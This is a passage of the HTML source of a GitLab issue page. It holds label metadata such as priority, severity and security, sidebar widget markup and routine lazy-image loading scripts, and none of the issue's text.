planning&quot;,&quot;color&quot;:&quot;#A8D695&quot;,&quot;description&quot;:&quot;Issues belonging to the Product Planning group of the Plan stage of the DevOps lifecycle. See https://about.gitlab.com/handbook/product/product-categories/#product-planning-group&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2019-05-22T19:55:52.229Z&quot;,&quot;updated_at&quot;:&quot;2020-10-16T19:33:41.349Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3857370,&quot;title&quot;:&quot;priority::1&quot;,&quot;color&quot;:&quot;#cc0000&quot;,&quot;description&quot;:&quot;We will address this as soon as possible regardless of limit on our team capacity. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#priority&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-04-13T07:50:27.056Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:23:21.667Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:14918378,&quot;title&quot;:&quot;section::dev&quot;,&quot;color&quot;:&quot;#F0AD4E&quot;,&quot;description&quot;:&quot;Issues related to the Dev section&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;updated_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2779335,&quot;title&quot;:&quot;security&quot;,&quot;color&quot;:&quot;#d9534f&quot;,&quot;description&quot;:&quot;Issues related to the security of GitLab or its dependencies. Please report vulnerabilities responsibly per https://about.gitlab.com/security/disclosure/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-10-05T14:36:39.341Z&quot;,&quot;updated_at&quot;:&quot;2023-05-24T20:20:05.269Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3713903,&quot;title&quot;:&quot;severity::1&quot;,&quot;color&quot;:&quot;#cc0000&quot;,&quot;description&quot;:&quot;Blocker - applies to bugs and bug categories of availability, performance, security and ux. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#severity&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-03-23T14:46:46.557Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:11:28.095Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false}]"></div>
<div class="block milestone" data-testid="sidebar-milestones">
<div class="js-sidebar-milestone-widget-root" data-can-edit="" data-issue-iid="327121" data-project-path="gitlab-org/gitlab"></div>
</div>
<div class="block" data-testid="iteration-container"><div class="js-sidebar-iteration-widget-root" data-can-edit="" data-group-path="gitlab-org" data-issue-id="84801598" data-issue-iid="327121" data-project-path="gitlab-org/gitlab"></div>
</div>
<div class="js-sidebar-weight-widget-root" data-can-edit="" data-issue-iid="327121" data-project-path="gitlab-org/gitlab"></div>

<div class="js-sidebar-due-date-widget-root"></div>
<div class="js-sidebar-time-tracking-root block">
<!-- / Fallback while content is loading -->
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Time tracking</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>
<div class="js-sidebar-health-status-widget-root" data-can-edit="" data-full-path="gitlab-org/gitlab" data-iid="327121" data-issuable-type="issue"></div>
<script id="js-confidential-issue-data" type="application/json">{"is_confidential":false,"is_editable":null}</script>
<div class="block">
<div class="hide-collapsed gl-flex gl-items-center gl-font-bold gl-leading-20 gl-text-default">
Confidentiality
</div>
<div class="hide-collapsed gl-text-subtle">
Confidentiality controls have moved to the issue actions menu (<svg class="s12 gl-align-middle" data-testid="ellipsis_v-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#ellipsis_v"></use></svg>) at the top of the page.
</div>
</div>

<div class="js-sidebar-participants-widget-root"></div>
</form><script class="js-sidebar-options" type="application/json">{"endpoint":"/gitlab-org/gitlab/-/issues/327121.json?serializer=sidebar_extras","toggleSubscriptionEndpoint":"/gitlab-org/gitlab/-/issues/327121/toggle_subscription","moveIssueEndpoint":"/gitlab-org/gitlab/-/issues/327121/move","projectsAutocompleteEndpoint":"/-/autocomplete/projects?project_id=278964","editable":"","currentUser":{},"rootPath":"/","fullPath":"gitlab-org/gitlab","iid":327121,"id":84801598,"severity":"unknown","timeTrackingLimitToHours":true,"canCreateTimelogs":null,"createNoteEmail":null,"issuableType":"issue","directlyInviteMembers":"false","weightOptions":["None","Any",0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20],"weightNoneValue":"None","multipleApprovalRulesAvailable":null}</script>
</div>
</aside>



</main>
</div>


</div>
</div>


<script nonce="4Pet/VRJ40dYDe4FWrh3Tg==">
//<![CDATA[
if ('loading' in HTMLImageElement.prototype) {
  document.querySelectorAll('img.lazy').forEach(img => {
    img.loading = 'lazy';
    let imgUrl = img.dataset.src;
    // Only adding width + height for avatars for now
    if (imgUrl.indexOf('/avatar/') > -1 && imgUrl.indexOf('?') === -1) {
      const targetWidth = img.getAttribute('width') || img.width;
      imgUrl += `?width=${targetWidth}`;
    }
    img.src = imgUrl;
    img.removeAttribute('data-src');
    img.classList.remove('lazy');
    img.classList.add('js-lazy-loaded');
    img.dataset.testid = 'js-lazy-loaded-content';
  });
}

//]]>
</script>
<script nonce="4Pet/VRJ40dYDe4FWrh3Tg==">
//<![CDATA[
gl = window.gl || {};
gl.experiments = {};


//]]>
</script>

</body>
</html>

